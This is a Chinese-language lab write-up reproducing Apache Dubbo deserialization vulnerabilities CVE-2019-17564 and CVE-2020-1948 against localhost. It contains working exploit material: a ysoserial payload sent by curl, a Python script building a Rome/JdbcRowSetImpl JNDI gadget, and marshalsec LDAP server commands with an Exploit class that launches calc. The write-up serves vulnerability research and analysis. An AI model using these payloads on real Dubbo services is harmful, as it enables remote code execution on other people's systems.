<p>Hessian协议用于集成Hessian的服务，Hessian底层采用Http通讯，采用Servlet暴露服务，Dubbo缺省内嵌Jetty作为服务器实现。</p>
<p>Dubbo的Hessian协议可以和原生Hessian服务互操作，即：</p>
<ul>
<li>提供者用Dubbo的Hessian协议暴露服务，消费者直接用标准Hessian接口调用</li>
<li>或者提供者用标准Hessian暴露服务，消费者用Dubbo的Hessian协议调用</li>
</ul>
<p><strong>协议关系</strong></p>
<ol>
<li>Dubbo 从大的层面上将是RPC框架，负责封装RPC调用，支持很多RPC协议</li>
<li>RPC协议包括了dubbo、rmi、hession、webservice、http、redis、rest、thrift、memcached、jsonrpc等</li>
<li>Java中的序列化有Java原生序列化、Hessian 序列化、Json序列化、dubbo 序列化</li>
</ol>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20201122225559.png" alt="image-20201003002926978" style="zoom:80%;" />

<p><strong>Dubbo架构</strong></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202106041245d4e3b0875ec74b326202.jpeg" alt="dubbo-architucture"></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>安装<code>zookeeper</code></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 从官网https://zookeeper.apache.org/releases.html下载</span><br><span class="line"># 将conf目录下的配置文件zoo_sample.cfg修改为zoo.cfg</span><br><span class="line"># 并且修改或添加配置文件中的dataDir和dadaLogDir地址</span><br><span class="line"># 运行bin目录下的zkServer启动zookeeper服务</span><br><span class="line">sudo ./zkServer.sh <span class="built_in">start</span></span><br></pre></td></tr></table></figure>

<p>或者用docker安装</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">docker run --rm --name zookeeper -p <span class="number">2181</span>:<span class="number">2181</span> zookeeper</span><br></pre></td></tr></table></figure>

<p>安装<code>dubbo-samples/dubbo-samples-http</code></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/apache/dubbo-samples.git</span><br><span class="line"># 使用dubbo-samples-http模块</span><br><span class="line"># 把resources/spring/http-provider.xml里面的端口修改为<span class="number">8081</span>（<span class="number">8080</span>容易起冲突）</span><br></pre></td></tr></table></figure>

<blockquote>
<p>master分支的dubbo-samples只能导入<strong>2.7.6</strong>及其以上版本的dubbo，低于这个版本的会抛出以下错误</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cannot resolve org.apache.dubbo:dubbo:unknown</span><br></pre></td></tr></table></figure>

<p>解决方法是下载<strong>2.6.x</strong>分支的<strong>dubbo-samples</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git checkout 2.6.x</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><blockquote>
<p>推荐使用此方法</p>
</blockquote>
<p>安装<code>dubbo-spring-boot-project</code></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/apache/dubbo-spring-boot-project.git</span><br><span class="line"><span class="built_in">cd</span> dubbo-spring-boot-project</span><br><span class="line">git checkout <span class="number">2</span>.<span class="number">7</span>.<span class="number">6</span></span><br></pre></td></tr></table></figure>

<h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>直接从docker中拉环境</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull dsolab/dubbo:cve-2020-1948</span><br><span class="line">docker run -p 12345:12345 dsolab/dubbo:cve-2020-1948 -d</span><br></pre></td></tr></table></figure>



<h2 id="JNDI工具"><a href="#JNDI工具" class="headerlink" title="JNDI工具"></a>JNDI工具</h2><h3 id="工具一"><a href="#工具一" class="headerlink" title="工具一"></a>工具一</h3><p><a href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a></p>
<blockquote>
<p>我看大家都在用，但是我觉得不好用，服务冗余，而且端口每次更改都要重新编译</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/welk1n/JNDI-Injection-Exploit.git</span><br><span class="line"><span class="built_in">cd</span> JNDI-Injection-Exploit</span><br><span class="line">mvn clean package -DskipTests</span><br><span class="line"># 保证<span class="number">1099</span>, <span class="number">1389</span>, <span class="number">8180</span>未被使用，或者自己修改端口</span><br><span class="line">java -jar JNDI-Injection-Exploit-<span class="number">1</span>.<span class="number">0</span>-SNAPSHOT-all.jar -C &quot;open /Applications/Calculator.app&quot; -A &quot;<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>&quot;</span><br></pre></td></tr></table></figure>

<h3 id="工具二"><a href="#工具二" class="headerlink" title="工具二"></a>工具二</h3><p><a href="https://github.com/mbechler/marshalsec">marshalsec</a></p>
<blockquote>
<p>推荐使用此方法</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Exploit.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// java.lang.Runtime.getRuntime().exec(&quot;touch /tmp/success&quot;);</span></span><br><span class="line">            java.lang.Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">javac Exploit.java</span><br><span class="line">python -m http.server <span class="number">8000</span></span><br><span class="line">java -cp marshalsec-<span class="number">0</span>.<span class="number">0</span>.<span class="number">3</span>-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">8000</span>/#Exploit <span class="number">1389</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里注意<code>http://127.0.0.1:8000/#Exploit</code>不要写成<code>http://127.0.0.1:8000#Exploit</code></p>
</blockquote>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="CVE-2019-17564"><a href="#CVE-2019-17564" class="headerlink" title="CVE-2019-17564"></a>CVE-2019-17564</h3><blockquote>
<p>2.7.0 &lt;&#x3D; Apache Dubbo &lt;&#x3D; 2.7.4.1</p>
<p>2.6.0 &lt;&#x3D; Apache Dubbo &lt;&#x3D; 2.6.7</p>
<p>Apache Dubbo &#x3D; 2.5.x</p>
</blockquote>
<p><strong>添加依赖</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>            </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>            </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>            </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>漏洞利用</strong></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-<span class="number">0</span>.<span class="number">0</span>.<span class="number">6</span>-SNAPSHOT-all.jar CommonsCollections5 calc &gt; payload.out</span><br><span class="line">curl http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">8081</span>/org.apache.dubbo.samples.http.api.DemoService --data-binary @payload.out</span><br></pre></td></tr></table></figure>

<p><strong>漏洞分析</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpInvokerServiceExporter</span> <span class="keyword">extends</span> <span class="title class_">RemoteInvocationSerializingExporter</span> <span class="keyword">implements</span> <span class="title class_">HttpRequestHandler</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleRequest</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">RemoteInvocation</span> <span class="variable">invocation</span> <span class="operator">=</span> <span class="built_in">this</span>.readRemoteInvocation(request); <span class="comment">// 处理requests内容</span></span><br><span class="line">            <span class="type">RemoteInvocationResult</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.invokeAndCreateResult(invocation, <span class="built_in">this</span>.getProxy());</span><br><span class="line">            <span class="built_in">this</span>.writeRemoteInvocationResult(request, response, result);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NestedServletException</span>(<span class="string">&quot;Class not found during deserialization&quot;</span>, var5);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">protected</span> RemoteInvocation <span class="title function_">readRemoteInvocation</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.readRemoteInvocation(request, request.getInputStream()); <span class="comment">// 获取requests的输入</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> RemoteInvocation <span class="title function_">readRemoteInvocation</span><span class="params">(HttpServletRequest request, InputStream is)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="built_in">this</span>.createObjectInputStream(<span class="built_in">this</span>.decorateInputStream(request, is));</span><br><span class="line"></span><br><span class="line">        RemoteInvocation var4;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var4 = <span class="built_in">this</span>.doReadRemoteInvocation(ois); <span class="comment">// 跟进输入处理</span></span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            ois.close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var4;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> RemoteInvocation <span class="title function_">readRemoteInvocation</span><span class="params">(HttpServletRequest request, InputStream is)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="built_in">this</span>.createObjectInputStream(<span class="built_in">this</span>.decorateInputStream(request, is));</span><br><span class="line"></span><br><span class="line">        RemoteInvocation var4;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var4 = <span class="built_in">this</span>.doReadRemoteInvocation(ois); <span class="comment">// 进入远程调用</span></span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            ois.close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var4;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>doReadRemoteInvocation()</code>函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">RemoteInvocationSerializingExporter</span> <span class="keyword">extends</span> <span class="title class_">RemoteInvocationBasedExporter</span> <span class="keyword">implements</span> <span class="title class_">InitializingBean</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> RemoteInvocation <span class="title function_">doReadRemoteInvocation</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject(); <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="keyword">if</span> (!(obj <span class="keyword">instanceof</span> RemoteInvocation)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RemoteException</span>(<span class="string">&quot;Deserialized object needs to be assignable to type [&quot;</span> + RemoteInvocation.class.getName() + <span class="string">&quot;]: &quot;</span> + ClassUtils.getDescriptiveType(obj));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (RemoteInvocation)obj;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>patch</strong></p>
<blockquote>
<p><a href="https://github.com/apache/dubbo/compare/dubbo-2.7.3...dubbo-2.7.4#diff-96ea3c598a0fa6d0ad3f028e676b17525d256692f9995f922267f83294dc04edR79">https://github.com/apache/dubbo/compare/dubbo-2.7.3...dubbo-2.7.4#diff-96ea3c598a0fa6d0ad3f028e676b17525d256692f9995f922267f83294dc04edR79</a></p>
</blockquote>
<p>将<code>HttpInvokerServiceExporter</code>转化为<code>JsonRpcServer</code> </p>
<h3 id="CVE-2020-1948"><a href="#CVE-2020-1948" class="headerlink" title="CVE-2020-1948"></a>CVE-2020-1948</h3><blockquote>
<p>2.7.0 &lt;&#x3D; Apache Dubbo &lt;&#x3D; 2.7.6</p>
<p>2.6.0 &lt;&#x3D; Apache Dubbo &lt;&#x3D; 2.6.7</p>
<p>Apache Dubbo &#x3D; 2.5.x</p>
</blockquote>
<p><strong>添加依赖</strong></p>
<blockquote>
<p>在dubbo-spring-boot-project\dubbo-spring-boot-samples\dubbo-registry-nacos-samples\provider-sample\pom.xml处添加</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.rometools<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>网上很多的分析文章直接把python版本和Java版本的混为一谈，整得我复现的时候一直出不来，后来才看到一篇文章说出了它们的区别，那些乱写的漏洞分析文章真是害人不浅…</p>
</blockquote>
<h4 id="Python版本"><a href="#Python版本" class="headerlink" title="Python版本"></a>Python版本</h4><p><strong>漏洞利用</strong></p>
<blockquote>
<p>适用于2.7.5之前的版本</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> dubbo.codec.hessian2 <span class="keyword">import</span> new_object</span><br><span class="line"><span class="keyword">from</span> dubbo.client <span class="keyword">import</span> DubboClient</span><br><span class="line"></span><br><span class="line">client = DubboClient(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">12345</span>)</span><br><span class="line"></span><br><span class="line">JdbcRowSetImpl=new_object(</span><br><span class="line">      <span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span>,</span><br><span class="line">      dataSource=<span class="string">&quot;ldap://127.0.0.1:8087/Exploit&quot;</span>,</span><br><span class="line">      strMatchColumns=[<span class="string">&quot;foo&quot;</span>]</span><br><span class="line">      )</span><br><span class="line">JdbcRowSetImplClass=new_object(</span><br><span class="line">      <span class="string">&#x27;java.lang.Class&#x27;</span>,</span><br><span class="line">      name=<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">      )</span><br><span class="line">toStringBean=new_object(</span><br><span class="line">      <span class="string">&#x27;com.rometools.rome.feed.impl.ToStringBean&#x27;</span>,</span><br><span class="line">      beanClass=JdbcRowSetImplClass,</span><br><span class="line">      obj=JdbcRowSetImpl</span><br><span class="line">      )</span><br><span class="line"></span><br><span class="line">resp = client.send_request_and_return_response(</span><br><span class="line">    service_name=<span class="string">&#x27;com.example.provider.service.UesrService&#x27;</span>,</span><br><span class="line">    method_name=<span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    args=[toStringBean])</span><br></pre></td></tr></table></figure>

<p><strong>漏洞分析</strong></p>
<p>漏洞链如下</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202106060011e9cbacf02b8aef2d57be.png" alt="image-20210605225549613" style="zoom:80%;" />

<p>入口点在<code>DecodeHandler</code>类的<code>received</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DecodeHandler</span> <span class="keyword">extends</span> <span class="title class_">AbstractChannelHandlerDelegate</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">received</span><span class="params">(Channel channel, Object message)</span> <span class="keyword">throws</span> RemotingException &#123;</span><br><span class="line">        <span class="keyword">if</span> (message <span class="keyword">instanceof</span> Decodeable) &#123;</span><br><span class="line">            <span class="built_in">this</span>.decode(message);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (message <span class="keyword">instanceof</span> Request) &#123;</span><br><span class="line">            <span class="built_in">this</span>.decode(((Request)message).getData());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (message <span class="keyword">instanceof</span> Response) &#123;</span><br><span class="line">            <span class="built_in">this</span>.decode(((Response)message).getResult());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.handler.received(channel, message); <span class="comment">// 持续跟进函数，会在一个getInvoker()地方抛出错误</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DubboProtocol</span> <span class="keyword">extends</span> <span class="title class_">AbstractProtocol</span> &#123;</span><br><span class="line">    </span><br><span class="line">    Invoker&lt;?&gt; getInvoker(Channel channel, Invocation inv) <span class="keyword">throws</span> RemotingException &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isCallBackServiceInvoke</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isStubServiceInvoke</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> channel.getLocalAddress().getPort();</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> (String)inv.getAttachments().get(<span class="string">&quot;path&quot;</span>);</span><br><span class="line">        isStubServiceInvoke = Boolean.TRUE.toString().equals(inv.getAttachments().get(<span class="string">&quot;dubbo.stub.event&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span> (isStubServiceInvoke) &#123;</span><br><span class="line">            port = channel.getRemoteAddress().getPort();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        isCallBackServiceInvoke = <span class="built_in">this</span>.isClientSide(channel) &amp;&amp; !isStubServiceInvoke;</span><br><span class="line">        <span class="keyword">if</span> (isCallBackServiceInvoke) &#123;</span><br><span class="line">            path = path + <span class="string">&quot;.&quot;</span> + (String)inv.getAttachments().get(<span class="string">&quot;callback.service.instid&quot;</span>);</span><br><span class="line">            inv.getAttachments().put(<span class="string">&quot;_isCallBackServiceInvoke&quot;</span>, Boolean.TRUE.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">serviceKey</span> <span class="operator">=</span> serviceKey(port, path, (String)inv.getAttachments().get(<span class="string">&quot;version&quot;</span>), (String)inv.getAttachments().get(<span class="string">&quot;group&quot;</span>));</span><br><span class="line">        DubboExporter&lt;?&gt; exporter = (DubboExporter)<span class="built_in">this</span>.exporterMap.get(serviceKey);</span><br><span class="line">        <span class="keyword">if</span> (exporter == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RemotingException</span>(channel, <span class="string">&quot;Not found exported service: &quot;</span> + serviceKey + <span class="string">&quot; in &quot;</span> + <span class="built_in">this</span>.exporterMap.keySet() + <span class="string">&quot;, may be version or group mismatch , channel: consumer: &quot;</span> + channel.getRemoteAddress() + <span class="string">&quot; --&gt; provider: &quot;</span> + channel.getLocalAddress() + <span class="string">&quot;, message:&quot;</span> + inv); <span class="comment">// 在这里抛出错误，因为涉及了字符串操作，所以会调用对应类的toString()方法</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> exporter.getInvoker();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>来到了<code>RpcInvocation</code>类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RpcInvocation</span> <span class="keyword">implements</span> <span class="title class_">Invocation</span>, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;RpcInvocation [methodName=&quot;</span> + <span class="built_in">this</span>.methodName + <span class="string">&quot;, parameterTypes=&quot;</span> + Arrays.toString(<span class="built_in">this</span>.parameterTypes) + <span class="string">&quot;, arguments=&quot;</span> + Arrays.toString(<span class="built_in">this</span>.arguments) + <span class="string">&quot;, attachments=&quot;</span> + <span class="built_in">this</span>.attachments + <span class="string">&quot;]&quot;</span>; <span class="comment">// 对我们传入的类调用了Arrays.toString()方法</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>来到了<code>ToStringBean</code>类的Gadget</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ToStringBean</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">toString</span><span class="params">(String prefix)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(<span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            List&lt;PropertyDescriptor&gt; propertyDescriptors = BeanIntrospector.getPropertyDescriptorsWithGetters(<span class="built_in">this</span>.beanClass);</span><br><span class="line">            <span class="type">Iterator</span> <span class="variable">var10</span> <span class="operator">=</span> propertyDescriptors.iterator();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(var10.hasNext()) &#123;</span><br><span class="line">                <span class="type">PropertyDescriptor</span> <span class="variable">propertyDescriptor</span> <span class="operator">=</span> (PropertyDescriptor)var10.next();</span><br><span class="line">                <span class="type">String</span> <span class="variable">propertyName</span> <span class="operator">=</span> propertyDescriptor.getName();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">getter</span> <span class="operator">=</span> propertyDescriptor.getReadMethod();</span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getter.invoke(<span class="built_in">this</span>.obj, NO_PARAMS); <span class="comment">// 调用相应类的get()方法</span></span><br><span class="line">                <span class="built_in">this</span>.printProperty(sb, prefix + <span class="string">&quot;.&quot;</span> + propertyName, value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var9) &#123;</span><br><span class="line">            LOG.error(<span class="string">&quot;Error while generating toString&quot;</span>, var9);</span><br><span class="line">            Class&lt;? <span class="keyword">extends</span> <span class="title class_">Object</span>&gt; clazz = <span class="built_in">this</span>.obj.getClass();</span><br><span class="line">            <span class="type">String</span> <span class="variable">errorMessage</span> <span class="operator">=</span> var9.getMessage();</span><br><span class="line">            sb.append(String.format(<span class="string">&quot;\n\nEXCEPTION: Could not complete %s.toString(): %s\n&quot;</span>, clazz, errorMessage));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>只要我们的<code>JdbcRowSetImpl</code>类设置了<code>databaseMetaData</code>属性就会调其<code>get()</code>方法，也就能触发其<code>lookup()</code>函数触发JNDI注入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImpl</span> <span class="keyword">extends</span> <span class="title class_">BaseRowSet</span> <span class="keyword">implements</span> <span class="title class_">JdbcRowSet</span>, Joinable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> DatabaseMetaData <span class="title function_">getDatabaseMetaData</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="built_in">this</span>.connect(); <span class="comment">// 跟进connect()</span></span><br><span class="line">        <span class="keyword">return</span> var1.getMetaData();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> Connection <span class="title function_">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.conn != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.conn;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.getDataSourceName() != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">InitialContext</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">                <span class="type">DataSource</span> <span class="variable">var2</span> <span class="operator">=</span> (DataSource)var1.lookup(<span class="built_in">this</span>.getDataSourceName()); <span class="comment">// 触发JNDI注入</span></span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.getUsername() != <span class="literal">null</span> &amp;&amp; !<span class="built_in">this</span>.getUsername().equals(<span class="string">&quot;&quot;</span>) ? var2.getConnection(<span class="built_in">this</span>.getUsername(), <span class="built_in">this</span>.getPassword()) : var2.getConnection();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="built_in">this</span>.resBundle.handleGetObject(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.getUrl() != <span class="literal">null</span> ? DriverManager.getConnection(<span class="built_in">this</span>.getUrl(), <span class="built_in">this</span>.getUsername(), <span class="built_in">this</span>.getPassword()) : <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Java版本"><a href="#Java版本" class="headerlink" title="Java版本"></a>Java版本</h4><p><strong>漏洞利用</strong></p>
<p>IDEA导入marshalsec</p>
<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20210605150037087.png" alt="image-20210605150037087" style="zoom:67%;" />

<p>修改<code>DemoService.java</code>，添加接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String <span class="title function_">commonTest</span><span class="params">(Object o)</span>;</span><br></pre></td></tr></table></figure>

<p>修改<code>DefaultDemoService.java</code>，实现接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">commonTest</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;pwned&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改<code>DubboAutoConfigurationConsumerBootstrap.java</code>，修改runner运行<code>commonTest()</code>方法</p>
<p><strong>漏洞分析</strong></p>
<p>漏洞链如下</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202106060011ed6ac1e20048a0fd8c2a.png" alt="image-20210606001138974" style="zoom:80%;" />

<p>入口点也在<code>DecodeHandler</code>类的<code>received</code>方法</p>
